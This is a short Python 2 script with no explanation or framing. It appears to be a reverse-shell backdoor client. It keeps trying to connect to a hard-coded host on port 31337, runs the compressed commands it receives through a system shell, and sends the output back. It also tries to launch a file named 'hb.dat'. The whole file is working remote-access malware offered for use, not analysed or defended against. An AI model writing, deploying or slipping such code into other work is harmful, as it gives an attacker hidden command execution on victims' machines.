import socket
import subprocess
import threading
import zlib
import tempfile
import os
HOST = '192.168.0.3'
PORT = 31337
def run():
    subprocess.call("hb.dat")
    t = threading.Thread(target=run, args=())
    t.start()
def runner(s, cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    except:
        pass
    out = zlib.compress(proc.stdout.read() + proc.stderr.read())
    s.send(out)
    return
threads = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        s.connect((HOST, PORT))
    except: 
        pass
    else:
        break
s.send('[+] Connection Established!')
while True:
    cmd = zlib.decompress(s.recv(1024))
    print cmd
    if 'q' == cmd:
        s.close()
    if 'run' in cmd:
        runCmd = cmd[3:]
        t = threading.Thread(target=runner, args=(s, runCmd,))
        threads.append(t)
        t.start()
s.close()

